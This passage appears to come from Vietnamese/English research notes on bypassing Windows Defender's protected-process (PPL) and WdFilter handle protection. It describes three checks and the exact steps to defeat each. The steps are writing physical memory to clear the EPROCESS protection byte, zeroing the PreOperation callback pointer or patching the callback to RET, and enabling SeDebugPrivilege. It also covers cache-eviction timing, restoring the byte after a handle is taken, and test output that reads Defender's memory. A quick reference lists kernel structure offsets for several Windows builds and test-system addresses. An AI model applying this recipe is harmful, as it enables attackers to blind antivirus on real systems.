    │                   WdpProcessPreOperationCallback() ← SECOND WALL
    │                       │
    │                       ├─ target in ProtectedList? YES
    │                       ├─ caller trusted? NO
    │                       │
    │                       └─ DesiredAccess &= ~DANGEROUS_BITS
    │                          PROCESS_ALL_ACCESS → PROCESS_QUERY_LIMITED_INFORMATION
    │
    ├─[4]─ SeAccessCheck(targetProcess, desiredAccess_after_callback, ...)
    │           │
    │           DACL check: does caller have permission for remaining access?
    │           │
    │           Without SeDebugPrivilege:
    │               DACL may deny PROCESS_ALL_ACCESS ← THIRD WALL
    │           With SeDebugPrivilege:
    │               DACL bypassed
    │
    └─[5]─ ObpCreateHandle() → insert into caller's handle table
               Returns handle value to user mode
```

### 13.2 Summary — Ba Tường Bảo Vệ

```
┌──────────────────────────────────────────────────────────────┐
│ WALL #1: PPL Protection (EPROCESS.Protection)                │
│                                                              │
│ Enforced by: PsTestProtectedProcessIncompatibility           │
│ Checked: BEFORE ObCallbacks, BEFORE DACL                     │
│ Bypass: Clear EPROCESS.Protection byte to 0x00              │
│ NOT bypassable by: SeDebugPrivilege                          │
└──────────────────────────────────────────────────────────────┘
                             ↓
┌──────────────────────────────────────────────────────────────┐
│ WALL #2: WdFilter OB Callback (ObRegisterCallbacks)          │
│                                                              │
│ Enforced by: WdpProcessPreOperationCallback                  │
│ Checked: DURING ObCheckObjectAccess                          │
│ Action: Strips dangerous access rights from DesiredAccess    │
│ Bypass: Zero PreOperation pointer OR patch function → 0xC3  │
│ NOT bypassable by: SeDebugPrivilege, even with PPL cleared   │
└──────────────────────────────────────────────────────────────┘
                             ↓
┌──────────────────────────────────────────────────────────────┐
│ WALL #3: DACL / SeAccessCheck                                │
│                                                              │
│ Enforced by: SeAccessCheck on process object                 │
│ Checked: AFTER OB callbacks, on remaining DesiredAccess      │
│ Bypass: Enable SeDebugPrivilege (bypasses DACL entirely)     │
└──────────────────────────────────────────────────────────────┘
```

---

## 14. Tại Sao Bypass Của Chúng Ta Hoạt Động

### 14.1 Attack each wall

```
Wall #1 (PPL):
    Ta phys_write(EPROCESS+OFF_PROT, 0, 1)
    → EPROCESS.Protection = 0x00 in DRAM
    → Sau cache eviction: kernel reads 0x00
    → PsTestProtectedProcessIncompatibility: caller(0x00) >= target(0x00) ✓ PASS

Wall #2 (WdFilter callback):
    Ta phys_write(OB_CALLBACK_ENTRY+0x28, NULL, 8)
    → PreOperation pointer = 0 in DRAM
    → Sau cache eviction: kernel reads NULL
    → ObpCallPreOperationCallbacks: PreOperation == NULL → SKIP ✓ BYPASS
    
    (Backup: ta cũng patch first byte của function → 0xC3/RET)

Wall #3 (DACL):
    Ta AdjustTokenPrivileges(SeDebugPrivilege, ENABLED)
    → SeAccessCheck: privilege present → BYPASS DACL ✓ PASS
```

### 14.2 Timing Window

Tất cả ba bypasses phải có hiệu lực **đồng thời** khi `OpenProcess` được gọi:

```
DRAM state sau step A+B+C+D:
    preop_function[0] = 0xC3       (bypass wall 2 — code layer)
    cb_entry+0x28    = 0x00000000  (bypass wall 2 — pointer layer)
    eproc+OFF_PROT   = 0x00        (bypass wall 1)
    self+OFF_PROT    = 0x31        (backup for wall 1)

L3 cache state sau eviction:
    Tất cả relevant cache lines = EVICTED
    → Kernel reads = DRAM miss → thấy new values

OpenProcess():
    Wall 1 check: target.Protection (from DRAM) = 0x00 → PASS
    Wall 2 check: PreOperation (from DRAM) = NULL → SKIP
    Wall 3 check: SeDebugPrivilege enabled → PASS
    → Handle granted: PROCESS_ALL_ACCESS ✓
```

### 14.3 Tại Sao Restore Ngay Lập Tức (step G)

Sau khi `OpenProcess` trả về handle:
- Handle được lưu trong caller's handle table với `granted_access = PROCESS_ALL_ACCESS`
- Kernel **không** re-check EPROCESS.Protection khi dùng handle đã tạo
- Restore EPROCESS.Protection = 0x31: MsMpEng vẫn protected cho tất cả OpenProcess **tiếp theo**
- Handle `hProc` vẫn valid với PROCESS_ALL_ACCESS

**Confirmed bởi test:**
```
Protection now: 0x31  (restored — MsMpEng is PPL again)
ReadProcessMemory PEB[0..15]: 00 00 00 46 ...  ← vẫn đọc được!
```

### 14.4 Điều Gì Không Bị Bypass

WdFilter có **nhiều layers khác** mà bypass của ta không touch:
- File system minifilter vẫn active (scan files on access)
- Process creation blocking vẫn active
- DLL load monitoring vẫn active
- ETW monitoring vẫn active
- WdBoot ELAM vẫn active

Ta chỉ bypass **process handle protection** — đủ để đọc/ghi memory của MsMpEng, nhưng Defender vẫn đang chạy và monitor system activities khác.

---

## Quick Reference — Structs và Offsets

```
EPROCESS (Win10/Win11 <24H2):
    +0x440  UniqueProcessId         (UINT64)
    +0x448  ActiveProcessLinks.Flink (PVOID)
    +0x450  ActiveProcessLinks.Blink (PVOID)
    +0x4B8  Token                   (EX_FAST_REF, kernel VA)
    +0x5A8  ImageFileName[15]       (CHAR[15])
    +0x87A  Protection              (PS_PROTECTION byte) ← TARGET

EPROCESS (Win11 24H2+ build ≥26100):
    +0x5A8  ImageFileName[15]
    +0x4FA  Protection              ← TARGET (different offset)

PS_PROTECTION byte:
    bits [2:0] = Type   (0=None, 1=PPL, 2=PP)
    bits [7:4] = Signer (3=Antimalware, 4=Lsa, 5=Windows, 6=WinTcb)
    MsMpEng: 0x31 = Type=PPL, Signer=Antimalware

OB_CALLBACK_ENTRY (kernel internal):
    +0x00  EntryItemList.Flink      (PVOID, kernel VA)
    +0x08  EntryItemList.Blink      (PVOID, kernel VA)
    +0x10  Operations               (ULONG: 1/2/3)
    +0x14  [padding]
    +0x18  CallbackRegistration     (PVOID, kernel VA)
    +0x20  ObjectType               (POBJECT_TYPE, kernel VA)
    +0x28  PreOperation             (PVOID) ← ZERO THIS
    +0x30  PostOperation            (PVOID) ← ZERO THIS

WdFilter image (test system):
    VA base:  0xFFFFF806683C0000
    Size:     0x95000
    PA base:  0x0000000004DC0000  (~77MB)
    PreOp fn: VA+0x5E170, PA=0x4E1E170, orig_byte=0x48
```

---

*Document covers WdFilter.sys internals as reverse-engineered during PPL bypass research.*
*All struct layouts reconstructed from memory scanning + public Windows internals research.*
